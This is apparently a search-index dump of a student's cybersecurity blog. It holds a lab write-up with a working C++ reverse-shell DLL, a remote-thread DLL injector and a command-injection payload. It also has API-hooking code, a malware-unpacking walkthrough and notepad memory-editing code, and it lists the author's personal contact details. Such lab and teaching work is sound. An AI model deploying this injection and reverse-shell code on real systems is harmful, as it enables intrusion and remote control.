will result in change in notepad process. With this in mind, we'll use code to automate our process. First, we'll try to find the memmory address associated with a value matched target pattern. Then. we'll try to change the value, and update the windows.","title":"Initial Observe"},{"location":"2024_9_1_notepad_tapper/#find-pattern","text":"VirtualQueryEx will help us run through all memmory address of target process (region size, data, premission, ...). We then check if the region has COMMIT and READWRITE permission. Once we capture all of those region, we'll initiate our find pattern function to find our target address. char* GetProcessMemory(DWORD proc_id, char *pattern, size_t patternLen){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); LPVOID base = 0x0; MEMORY_BASIC_INFORMATION memInfo; size_t bytesread; int skip = 0; while (VirtualQueryEx(hproc, base, &memInfo, sizeof(memInfo))){ if (skip > 4){ if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE){ char *lpBuffer = (char *)malloc(memInfo.RegionSize); ReadProcessMemory(hproc, base, lpBuffer, memInfo.RegionSize, NULL); char* match = FindPattern(lpBuffer, memInfo.RegionSize, pattern, patternLen); if (match){ uint64_t diff = (uint64_t)match - (uint64_t)(lpBuffer); char* processPtr = (char *)base + diff; return processPtr; } } } // cout << endl << endl; skip ++; base += memInfo.RegionSize; } return nullptr; } To find pattern, first we'll initiate a pointer, ptr , points to the base address of target region. Then we'll move up until ptr is region size away from the base address. This can be done using this code: char* FindPattern(char* src, size_t srcLen, const char* pattern, size_t patternLen){ char* cur = src; size_t curPos = 0; while (curPos < srcLen){ if (memcmp(cur, pattern, patternLen) == 0){ return cur; } curPos++; cur = &src[curPos]; } return nullptr; } Next up, it's time to change the value and we all done.","title":"Find pattern"},{"location":"2024_9_1_notepad_tapper/#change-value","text":"There's a problem with changing value in memory address: 1) Value is changed but notepad's display may not be updated immediately. Manual interact with notepad process is required. 2) Region size is fixed. Updated value is constrained within that box. Tackling (1) is not that hard. Windows offers InvalidateRect functionality, which can force a process's window to update. bool UpdateProcessMemory(DWORD proc_id, LPVOID base, size_t size){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); MEMORY_BASIC_INFORMATION memInfo; // char *payload = UTF16Convert((char *)target.c_str()); if(!WriteProcessMemory(hproc, base, buffer, size, NULL)){ return false; } RECT r; GetClientRect(notepad_hwnd, &r); InvalidateRect(notepad_hwnd, &r, false); return true; } Let's get into space shooter for notepad","title":"Change value"},{"location":"2024_9_1_notepad_tapper/#space-shooter","text":"Each line in notepad associates with one memory address. To make a game, we'll need to have the control of entire screen or notepad windows. To achieve this, the simplest way is to enable word wrap in notepad; we just have to deal with 1 giant word (1 memory address). However, recording keyboard input is not that easy. There's one way we can global hook keyboard; however, this will make anytime we press a key, an action will be initiated to space shooter game, no matter if we have notepad process as active window or not. To achieve this, we can install hook inside notepad process, then use socket api to transfer key stroke out to the main program to update space shooter. Our plan here in general is to build a dll that acts both like a keystroke capture and a socket client. We'll then hook that dll into notepad process. SetWindowsHookExA really actually helps hook keyboard with a dll. Payload dll should be loaded first by LoadLibraryA . Once it's loaded, export function will be accessible to main program, whose address got by GetProcessAddress can be used in SetWindowsHookExA . void InstallHook(DWORD thread_id){ TCHAR dll_path[MAX_PATH]; GetFullPathName(TEXT(\"./keyboard_dll.dll\"), MAX_PATH, dll_path, NULL); cout << dll_path << endl; HMODULE hooklib = LoadLibraryA((LPCSTR)dll_path); HOOKPROC hookfunc = (HOOKPROC)GetProcAddress(hooklib, \"HookProcedure\"); HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD, hookfunc, hooklib, thread_id); cout << \"Run\" << endl; while(GetMessage(NULL, NULL, WM_KEYFIRST, WM_KEYLAST)){} UnhookWindowsHookEx(keyboardhook); }","title":"Space shooter"},{"location":"2024_9_1_notepad_tapper/#write-dll","text":"One can compile dll from C++ or C code; basically the way C++ and C code works and written is the same; however, with C++, we have to wrap the following around our exported function: #ifdef __cplusplus extern \"C\" { #endif #ifdef __cplusplus } #endif Funtion to be exported can be defined like this: __declspec(dllexport) LRESULT CALLBACK name_of_function(param) Within dll file, DllMain is the entrypoint. DllMain can be defined like this BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) Exported function can be run when dll is attached or detached to or from a process or thread using the following template: BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Dll can be compiled by g++ name.cpp -shared -o name.dll Sometimes, additional library flag needs to be added to compile, for example -lws2_32 for socket use","title":"Write dll"},{"location":"2024_9_1_notepad_tapper/#wrap-up","text":"24d8c0b19ce903c5812038c84cc93cb407e6bfa0 I'll not discuss how to set up socket server and client using windows api here, but this documentation might help: Socket Client and Socket Server Putting it all together, dll and server code can be found in my Github repo I'll not discuss in detail the logic of game shooter here, but the code for it can be found in my Github repo as well The full code can be found here . Here's some result:","title":"Wrap up"}]}
=======
{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"About me I'm Phuc; I'm pursuing B.S. in Cybersecurity Engineering at University of Cincinnati . I love playing piano, video games and capturing pictures of life. Currently, I'm doing Coop at Dr. Wang's lab at University of Cincinnati, working on side channel attack on AES encryption inside microcontrollers. My work includes assisting other graduate and senior undergraduate student on the research, summarizing experimental results and research findings, implementing and training neural network for deep learning side channel attack, performing side channel attack based CPA on AES. I have experience with reverse engineering and malware analysis using IDA, Ghidra, x64dbg, PE editor, PE bear. I also have experience with malware development using technique like DLL injection, thread hijacking, function hooking, Linux process injection with ptrace. I also have had sometime doing DFIR through practical labs. Last summer, I had an opportunity working with Viettel Cyber Security , where I had sometime doing log collection on customer's internal server for threat hunting operation later on. I also had a chance to watch operation in SOC, and learn about what's going on in real life industry. It was such amazing experience. For future, my goal is to work in Blue Team. The distance from me as of today to a Blue Teamer is long, and there are still alot of things and experience I have to acquire. With that in mind, I'm looking for a Coop/Intern position in summer of 2025 to gain more experience. Contact Email: maipd@mail.uc.edu Phone number: 949-247-6212 Github: https://github.com/mdphuc My file: https://github.com/mdphuc/myfile","title":"About"},{"location":"#about-me","text":"I'm Phuc; I'm pursuing B.S. in Cybersecurity Engineering at University of Cincinnati . I love playing piano, video games and capturing pictures of life. Currently, I'm doing Coop at Dr. Wang's lab at University of Cincinnati, working on side channel attack on AES encryption inside microcontrollers. My work includes assisting other graduate and senior undergraduate student on the research, summarizing experimental results and research findings, implementing and training neural network for deep learning side channel attack, performing side channel attack based CPA on AES. I have experience with reverse engineering and malware analysis using IDA, Ghidra, x64dbg, PE editor, PE bear. I also have experience with malware development using technique like DLL injection, thread hijacking, function hooking, Linux process injection with ptrace. I also have had sometime doing DFIR through practical labs. Last summer, I had an opportunity working with Viettel Cyber Security , where I had sometime doing log collection on customer's internal server for threat hunting operation later on. I also had a chance to watch operation in SOC, and learn about what's going on in real life industry. It was such amazing experience. For future, my goal is to work in Blue Team. The distance from me as of today to a Blue Teamer is long, and there are still alot of things and experience I have to acquire. With that in mind, I'm looking for a Coop/Intern position in summer of 2025 to gain more experience.","title":"About me"},{"location":"#contact","text":"Email: maipd@mail.uc.edu Phone number: 949-247-6212 Github: https://github.com/mdphuc My file: https://github.com/mdphuc/myfile","title":"Contact"},{"location":"2024_7_27_procinj/","text":"I created a Windows 10 Vuln machine July 27 2024 I created a windows 10 machine called ProcInj, focusing on process injection and path traversal technique to get reverse shell. This writeup serves as a guide to solve the machine. Instruction to set up the lab can be seen in https://github.com/mdphuc/myfile/tree/main/VM/ProcInj/README.md ProcInj hosts a website as below After messing around with the website, we notice that there's a form commented on the website, uncomment it and submit the form we have a zip file downloaded to our machine Try open it, we notice it's password protected Use JohnTheRipper to crack the password with password list: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/common-passwords-win.txt Unzip the file and open information.txt we have Messing around with the website, we notice it is used to compile a .cpp file into exe or dll. However, it forbids us to compile .cpp file with windows api into exe. Information.txt tells us that only C://ProgramData/ProcInj/System/debug.exe can run. Further test also shows that we can submit customed command with the form (We can craft it like hello && echo \"1\" > hello.txt then a file named hello.txt with 1 as its content will be created) As what Information.txt shows, our plan now is to create a dll file with windows api and run it by inject it into another process Our testdll.dll is crafted as followed #include <iostream> #include <windows.h> #include <winsock2.h> #include <stdio.h> #pragma comment(lib, \"w2_32\") using namespace std; #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) int __cdecl mbox(LPCWSTR msg){ WSADATA wsaData; SOCKET wSock; struct sockaddr_in hax; STARTUPINFO sui; PROCESS_INFORMATION pi; char *ip = \"192.168.1.25\"; short port = 4444; // init socket lib WSAStartup(MAKEWORD(2, 2), &wsaData); // create socket wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); hax.sin_family = AF_INET; hax.sin_port = htons(port); hax.sin_addr.s_addr = inet_addr(ip); // connect to remote host WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(&sui, 0, sizeof(sui)); sui.cb = sizeof(sui); sui.dwFlags = STARTF_USESTDHANDLES; sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; // start cmd.exe with redirected streams CreateProcess(NULL, \"powershell.exe\", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); exit(0); MessageBox(NULL, TEXT(\"HELLO WORLD\"), TEXT(\"TEST\"), MB_OK); return 1; } #ifdef __cplusplus } #endif BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: mbox(L\"Run\"); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Our debug.exe for injection is crafted as followed #include <windows.h> #include <tlhelp32.h> #include <iostream> #include <psapi.h> using namespace std; BOOL CompareCHAR(CHAR *char1, CHAR *char2){ int i = 0; while(char1[i] != '\\0' && char2[i] != '\\0'){ if (char1[i] != char2[i]){ return false; } i ++; } if ((char1[i] == '\\0' && char2[i] != '\\0') || (char1[i] != '\\0' && char2[i] == '\\0')){ return false; } return true; } DWORD GetProcessID(CHAR *process_name){ HANDLE process_snap; PROCESSENTRY32 pe32; HANDLE handle_process; process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(process_snap, &pe32); do{ if (CompareCHAR((CHAR*)pe32.szExeFile, process_name)){ return pe32.th32ProcessID; } // cout << pe32.szExeFile << \" \" << process_name << endl; }while(Process32Next(process_snap, &pe32)); return 0; } BOOL Inject(TCHAR *dll_to_inject, DWORD process_id_inject_to){ TCHAR dll_path[MAX_PATH]; GetFullPathName(dll_to_inject, MAX_PATH, dll_path, NULL); HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id_inject_to); LPVOID dllalloc = VirtualAllocEx(hproc, NULL, strlen((CHAR*)dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hproc, dllalloc, dll_path, strlen((CHAR*)dll_path), NULL); FARPROC loadlibraryA_addr = GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"LoadLibraryA\"); HANDLE rthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryA_addr, dllalloc, 0, NULL); WaitForSingleObject(rthread, INFINITE); return true; } int main(){ TCHAR dll_to_inject[MAX_PATH] = TEXT(\"C://ProgramData/ProcInj/Web/compiled/testdll.dll\"); CHAR process_to_get_id[] = \"cmd.exe\"; DWORD pid = GetProcessID(process_to_get_id); if (pid == 0){ cout << \"Cannot find id of target process\"; return 1; } cout << pid << endl; cout << Inject(dll_to_inject, pid); } This is your netcat server to receive reverse shell (change it accordingly to your own) char *ip = \"192.168.1.25\" short port = 4444 debug.exe is used to get cmd.exe's process id, and injection testdll.dll into that process id. Once CreateRemoteThread and WaitForSingleObject are called, function mbox in testdll.dll will run Information.txt tells us that debug.txt leaves under C://ProgramData/ProcInj/System, and website reveals ./Web/compiled . We guess that website is running under C://ProgramData/ProcInj/Web and sure file after being compiled will be stored at ./Web/compiled , so we may probably use ../.. in our payload We will initiate the process with these following payload respectively testdll.cpp -shared -lws2_32 -o testdll.dll debug.cpp -o ../../System/debug.exe hello && powershell C://ProgramData/ProcInj/System/debug.exe We got reverse shell in the end We also notice that we cannot use tasklist or tskill or stop-process to stop av.exe; however, once we got the shell, it's ok to do that and get full access of the shell","title":"I created a Windows 10 Vuln machine"},{"location":"2024_7_27_procinj/#i-created-a-windows-10-vuln-machine","text":"July 27 2024 I created a windows 10 machine called ProcInj, focusing on process injection and path traversal technique to get reverse shell. This writeup serves as a guide to solve the machine. Instruction to set up the lab can be seen in https://github.com/mdphuc/myfile/tree/main/VM/ProcInj/README.md ProcInj hosts a website as below After messing around with the website, we notice that there's a form commented on the website, uncomment it and submit the form we have a zip file downloaded to our machine Try open it, we notice it's password protected Use JohnTheRipper to crack the password with password list: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/common-passwords-win.txt Unzip the file and open information.txt we have Messing around with the website, we notice it is used to compile a .cpp file into exe or dll. However, it forbids us to compile .cpp file with windows api into exe. Information.txt tells us that only C://ProgramData/ProcInj/System/debug.exe can run. Further test also shows that we can submit customed command with the form (We can craft it like hello && echo \"1\" > hello.txt then a file named hello.txt with 1 as its content will be created) As what Information.txt shows, our plan now is to create a dll file with windows api and run it by inject it into another process Our testdll.dll is crafted as followed #include <iostream> #include <windows.h> #include <winsock2.h> #include <stdio.h> #pragma comment(lib, \"w2_32\") using namespace std; #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) int __cdecl mbox(LPCWSTR msg){ WSADATA wsaData; SOCKET wSock; struct sockaddr_in hax; STARTUPINFO sui; PROCESS_INFORMATION pi; char *ip = \"192.168.1.25\"; short port = 4444; // init socket lib WSAStartup(MAKEWORD(2, 2), &wsaData); // create socket wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); hax.sin_family = AF_INET; hax.sin_port = htons(port); hax.sin_addr.s_addr = inet_addr(ip); // connect to remote host WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(&sui, 0, sizeof(sui)); sui.cb = sizeof(sui); sui.dwFlags = STARTF_USESTDHANDLES; sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; // start cmd.exe with redirected streams CreateProcess(NULL, \"powershell.exe\", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); exit(0); MessageBox(NULL, TEXT(\"HELLO WORLD\"), TEXT(\"TEST\"), MB_OK); return 1; } #ifdef __cplusplus } #endif BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: mbox(L\"Run\"); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Our debug.exe for injection is crafted as followed #include <windows.h> #include <tlhelp32.h> #include <iostream> #include <psapi.h> using namespace std; BOOL CompareCHAR(CHAR *char1, CHAR *char2){ int i = 0; while(char1[i] != '\\0' && char2[i] != '\\0'){ if (char1[i] != char2[i]){ return false; } i ++; } if ((char1[i] == '\\0' && char2[i] != '\\0') || (char1[i] != '\\0' && char2[i] == '\\0')){ return false; } return true; } DWORD GetProcessID(CHAR *process_name){ HANDLE process_snap; PROCESSENTRY32 pe32; HANDLE handle_process; process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(process_snap, &pe32); do{ if (CompareCHAR((CHAR*)pe32.szExeFile, process_name)){ return pe32.th32ProcessID; } // cout << pe32.szExeFile << \" \" << process_name << endl; }while(Process32Next(process_snap, &pe32)); return 0; } BOOL Inject(TCHAR *dll_to_inject, DWORD process_id_inject_to){ TCHAR dll_path[MAX_PATH]; GetFullPathName(dll_to_inject, MAX_PATH, dll_path, NULL); HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id_inject_to); LPVOID dllalloc = VirtualAllocEx(hproc, NULL, strlen((CHAR*)dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hproc, dllalloc, dll_path, strlen((CHAR*)dll_path), NULL); FARPROC loadlibraryA_addr = GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"LoadLibraryA\"); HANDLE rthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryA_addr, dllalloc, 0, NULL); WaitForSingleObject(rthread, INFINITE); return true; } int main(){ TCHAR dll_to_inject[MAX_PATH] = TEXT(\"C://ProgramData/ProcInj/Web/compiled/testdll.dll\"); CHAR process_to_get_id[] = \"cmd.exe\"; DWORD pid = GetProcessID(process_to_get_id); if (pid == 0){ cout << \"Cannot find id of target process\"; return 1; } cout << pid << endl; cout << Inject(dll_to_inject, pid); } This is your netcat server to receive reverse shell (change it accordingly to your own) char *ip = \"192.168.1.25\" short port = 4444 debug.exe is used to get cmd.exe's process id, and injection testdll.dll into that process id. Once CreateRemoteThread and WaitForSingleObject are called, function mbox in testdll.dll will run Information.txt tells us that debug.txt leaves under C://ProgramData/ProcInj/System, and website reveals ./Web/compiled . We guess that website is running under C://ProgramData/ProcInj/Web and sure file after being compiled will be stored at ./Web/compiled , so we may probably use ../.. in our payload We will initiate the process with these following payload respectively testdll.cpp -shared -lws2_32 -o testdll.dll debug.cpp -o ../../System/debug.exe hello && powershell C://ProgramData/ProcInj/System/debug.exe We got reverse shell in the end We also notice that we cannot use tasklist or tskill or stop-process to stop av.exe; however, once we got the shell, it's ok to do that and get full access of the shell","title":"I created a Windows 10 Vuln machine"},{"location":"2024_7_28_hook_api/","text":"x86 and x86_64 Function Hooking July 28 2024 Disclaimer: The ideas demonstrated here can be applied to both windows api function and normal user-supplied funciton Hook API is a technique of redirecting a Windows API call to our own customed function. In this blog post, I will discuss hooking in windows x86 (32 bit) and x64 (64 bit) by going over of hooking MessageBoxA function to display other content instead of user given content. The process of hooking in general can be seen as followed: The purpose of changing a few first bytes is for when that Windows API is called, RIP will point to the first instruction of that Windows API. In this situation, RIP will call a set of instruction to jump to our function first, then we do our malicious thing, restore those bytes and return. After this, the hooked function will resume its execution normally. For x86 machine, memory address is stored by 4 bytes and jmp instruction can be called directly to the memory address. jmp is 1 byte, that's why we need to take 5 bytes out For x64 machine, memory address is stored by 8 bytes and jmp instruction cannot be called directly to the memory address. We need to place that address into rax register and jmp to that register. jmp is 1 byte, rax is 2 byte, and memory address is 8 byte. The total is 12 bytes With that in mind, we can construct our code like this #include <windows.h> #include <iostream> using namespace std; BYTE *msgbox; BYTE originalBytes[12] = {0}; int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType); bool DeleteHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(msgbox + i) = *(DWORD64*)(originalBytes + i) ; } VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } bool SetHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(originalBytes + i) = *(DWORD64*)(msgbox + i); } *(BYTE *)(msgbox) = 0x48; *(BYTE *)(msgbox + 1) = 0xB8; //mov rax, ... *(DWORD64 *)(msgbox + 2) = FunctionHookTo; *(BYTE *)(msgbox + 10) = 0xFF; *(BYTE *)(msgbox + 11) = 0xE0; // jmp rax VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ int r; cout << \"Hello\" << endl; DeleteHook(); r = MessageBoxA(hwnd, \"Hooked\", lpCaption, uType); SetHook(); return 0; } void LaunchMessageBox(LPCSTR text, LPCSTR caption){ MessageBoxA(0, text, caption, MB_OK); } int main(){ msgbox = (BYTE *)GetProcAddress(GetModuleHandleA(\"user32.dll\"), \"MessageBoxA\"); SetHook(); while (true){ string launch_msg_box; string text, caption; cout << \"Launch message box? (y/n): \"; cin >> launch_msg_box; if (launch_msg_box == \"y\"){ cout << \"Text = \"; cin >> text; cout << \"Caption = \"; cin >> caption; cout << endl; LaunchMessageBox(LPCSTR(text.c_str()), LPCSTR(caption.c_str())); } } cout << \"Finish\" << endl; } User specify message box with one caption and content, but displayed message box will have attacker's adjustment I'll discuss the implementation of function hooking on Windows 10 notepad","title":"Introduction"},{"location":"2024_7_28_hook_api/#x86-and-x86_64-function-hooking","text":"July 28 2024 Disclaimer: The ideas demonstrated here can be applied to both windows api function and normal user-supplied funciton Hook API is a technique of redirecting a Windows API call to our own customed function. In this blog post, I will discuss hooking in windows x86 (32 bit) and x64 (64 bit) by going over of hooking MessageBoxA function to display other content instead of user given content. The process of hooking in general can be seen as followed: The purpose of changing a few first bytes is for when that Windows API is called, RIP will point to the first instruction of that Windows API. In this situation, RIP will call a set of instruction to jump to our function first, then we do our malicious thing, restore those bytes and return. After this, the hooked function will resume its execution normally. For x86 machine, memory address is stored by 4 bytes and jmp instruction can be called directly to the memory address. jmp is 1 byte, that's why we need to take 5 bytes out For x64 machine, memory address is stored by 8 bytes and jmp instruction cannot be called directly to the memory address. We need to place that address into rax register and jmp to that register. jmp is 1 byte, rax is 2 byte, and memory address is 8 byte. The total is 12 bytes With that in mind, we can construct our code like this #include <windows.h> #include <iostream> using namespace std; BYTE *msgbox; BYTE originalBytes[12] = {0}; int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType); bool DeleteHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(msgbox + i) = *(DWORD64*)(originalBytes + i) ; } VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } bool SetHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(originalBytes + i) = *(DWORD64*)(msgbox + i); } *(BYTE *)(msgbox) = 0x48; *(BYTE *)(msgbox + 1) = 0xB8; //mov rax, ... *(DWORD64 *)(msgbox + 2) = FunctionHookTo; *(BYTE *)(msgbox + 10) = 0xFF; *(BYTE *)(msgbox + 11) = 0xE0; // jmp rax VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ int r; cout << \"Hello\" << endl; DeleteHook(); r = MessageBoxA(hwnd, \"Hooked\", lpCaption, uType); SetHook(); return 0; } void LaunchMessageBox(LPCSTR text, LPCSTR caption){ MessageBoxA(0, text, caption, MB_OK); } int main(){ msgbox = (BYTE *)GetProcAddress(GetModuleHandleA(\"user32.dll\"), \"MessageBoxA\"); SetHook(); while (true){ string launch_msg_box; string text, caption; cout << \"Launch message box? (y/n): \"; cin >> launch_msg_box; if (launch_msg_box == \"y\"){ cout << \"Text = \"; cin >> text; cout << \"Caption = \"; cin >> caption; cout << endl; LaunchMessageBox(LPCSTR(text.c_str()), LPCSTR(caption.c_str())); } } cout << \"Finish\" << endl; } User specify message box with one caption and content, but displayed message box will have attacker's adjustment I'll discuss the implementation of function hooking on Windows 10 notepad","title":"x86 and x86_64 Function Hooking"},{"location":"2024_8_12_recon_upx_analysis/","text":"Recon_upx: The analysis of UPX-packed file Aug 12 2024 File: recon_upx In this blog post, I'll be discussing the use of IDA in performing static and dynamic analysis and unpacking a malware file. For more information related to IDA, visit https://hex-rays.com/ida-pro/ . IDA example: https://www.hackers-arise.com/post/2017/06/22/Reverse-Engineering-Malware-Part-3-IDA-Pro-Introduction First thing first, we'll use file command to get the information about the architecture of the file file ./recon_upx It's pointed out that recon_upx is actually an ELF 64 bit file (built specifically to run on Linux/UNIX). The file is statically linked and no section header. Normally, for a basic ELF file, there are .text , .bss , and .data section headers. This is to say that this ELF file is probably packed. The malware will unpack itself during run time, and then continue executing malicious code. readelf -a ./recon_upx also validates the packed state of recon_upx as explained above Our task here is first to unpack the file, then to analyze the file. For unpacking, we'll use IDA. Let's first load the program in IDA: According to readelf's output, once the program runs, EIP will first point to the entry point address 0x403858 (which is the address of start ) Going through many instructions below, we can see `sys_write (write to file, screen, memory, ...), sys_open (open file or virtual memory), sys_mmap (allocate virtual memory space), sys_mprotect (works like VirtualProtect Windows api to change permission of that virtual memory space). It seems like the program is trying to decompress itself into its own virtual memory. Notice that program continues by doing jmp r13 . We'll set a breakpoint here, 0x403AFC , to observe corresponding actions. Look at segments at this breakpoint, we can see recon_upx has 0x5000 in its virtual memory space from 0x7FFFF7FF4000 to 0x7FFFF7FF9000 containing DATA and CODE Hex dump we have We can presume that the program will then unpack code inside this section and write to its base segments. Continue execution we reach this point, 0x7FFFF7FF7C66 , followed by instruction at 0x408C01 , where there are syscall exit and retn . Debug until RIP reaches jmp r12 , we have segments table like this Segments of recon_upx have been changed, we can presume the unpacking process has finished Continue debuging we'll hit __libc_start_main , and if we'll let the program continue running, main malicious process will be deployed At start , we saw recon_upx spans from 0x400000 to 0x609308 When we hit jmp r12 as shown above, we can dump memory out using the following python code Once file is dumped, we can then try to fix file header and segments. Then we'll have complete file, which can further be analyzed by IDA (pseudocode). This dump memory process can also be done using IDA pro and its plugin https://github.com/WPeace-HcH/ElfDumper . This plugin allows more efficient dumping and no need to worry about fixing file headers and segments After this, we can load the dumped file in IDA again and use pseudocode to analyze the functionality of recon_upx","title":"Recon_upx The analysis of UPX-packed file"},{"location":"2024_8_12_recon_upx_analysis/#recon_upx-the-analysis-of-upx-packed-file","text":"Aug 12 2024 File: recon_upx In this blog post, I'll be discussing the use of IDA in performing static and dynamic analysis and unpacking a malware file. For more information related to IDA, visit https://hex-rays.com/ida-pro/ . IDA example: https://www.hackers-arise.com/post/2017/06/22/Reverse-Engineering-Malware-Part-3-IDA-Pro-Introduction First thing first, we'll use file command to get the information about the architecture of the file file ./recon_upx It's pointed out that recon_upx is actually an ELF 64 bit file (built specifically to run on Linux/UNIX). The file is statically linked and no section header. Normally, for a basic ELF file, there are .text , .bss , and .data section headers. This is to say that this ELF file is probably packed. The malware will unpack itself during run time, and then continue executing malicious code. readelf -a ./recon_upx also validates the packed state of recon_upx as explained above Our task here is first to unpack the file, then to analyze the file. For unpacking, we'll use IDA. Let's first load the program in IDA: According to readelf's output, once the program runs, EIP will first point to the entry point address 0x403858 (which is the address of start ) Going through many instructions below, we can see `sys_write (write to file, screen, memory, ...), sys_open (open file or virtual memory), sys_mmap (allocate virtual memory space), sys_mprotect (works like VirtualProtect Windows api to change permission of that virtual memory space). It seems like the program is trying to decompress itself into its own virtual memory. Notice that program continues by doing jmp r13 . We'll set a breakpoint here, 0x403AFC , to observe corresponding actions. Look at segments at this breakpoint, we can see recon_upx has 0x5000 in its virtual memory space from 0x7FFFF7FF4000 to 0x7FFFF7FF9000 containing DATA and CODE Hex dump we have We can presume that the program will then unpack code inside this section and write to its base segments. Continue execution we reach this point, 0x7FFFF7FF7C66 , followed by instruction at 0x408C01 , where there are syscall exit and retn . Debug until RIP reaches jmp r12 , we have segments table like this Segments of recon_upx have been changed, we can presume the unpacking process has finished Continue debuging we'll hit __libc_start_main , and if we'll let the program continue running, main malicious process will be deployed At start , we saw recon_upx spans from 0x400000 to 0x609308 When we hit jmp r12 as shown above, we can dump memory out using the following python code Once file is dumped, we can then try to fix file header and segments. Then we'll have complete file, which can further be analyzed by IDA (pseudocode). This dump memory process can also be done using IDA pro and its plugin https://github.com/WPeace-HcH/ElfDumper . This plugin allows more efficient dumping and no need to worry about fixing file headers and segments After this, we can load the dumped file in IDA again and use pseudocode to analyze the functionality of recon_upx","title":"Recon_upx: The analysis of UPX-packed file"},{"location":"2024_9_1_notepad_tapper/","text":"Notepad tapper Sep 1 2024 Disclaimer: The techniques discussed here work on Windows 10 notepad, but not Windows 11 notepad Introduction In this blog, I'll discuss how you can change data displayed on notepad process using code, and then showcase a simple space shooter game for notepad. We'll use windows api and Cheat Engine to achieve this. For more information of Cheat Engine, please visit: https://wiki.cheatengine.org/index.php?title=Tutorials:Cheat_Engine_Tutorial_Guide_x64 . This blog is inspired by Kyle Halladay 's post: Hooking Keyboard Input To Play Snake In Notepad.exe Initial Observe With Cheat Engine, we can find the address of specific word within notepad process (what we're trying to do). As of notepad, though it specifically say UTF_8 at the bottom right corner, data is actually encoded by UTF_16. How we know it? Let's examine using Cheat Engine. Let's try to find address of hello in the memory Fire up Cheat Engine and search for hello in UTF_8 we have nothing in return However, if we change the search to UTF_16, an address pops up Change value of this memory address will result in change in notepad process. With this in mind, we'll use code to automate our process. First, we'll try to find the memmory address associated with a value matched target pattern. Then. we'll try to change the value, and update the windows. Find pattern VirtualQueryEx will help us run through all memmory address of target process (region size, data, premission, ...). We then check if the region has COMMIT and READWRITE permission. Once we capture all of those region, we'll initiate our find pattern function to find our target address. char* GetProcessMemory(DWORD proc_id, char *pattern, size_t patternLen){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); LPVOID base = 0x0; MEMORY_BASIC_INFORMATION memInfo; size_t bytesread; int skip = 0; while (VirtualQueryEx(hproc, base, &memInfo, sizeof(memInfo))){ if (skip > 4){ if 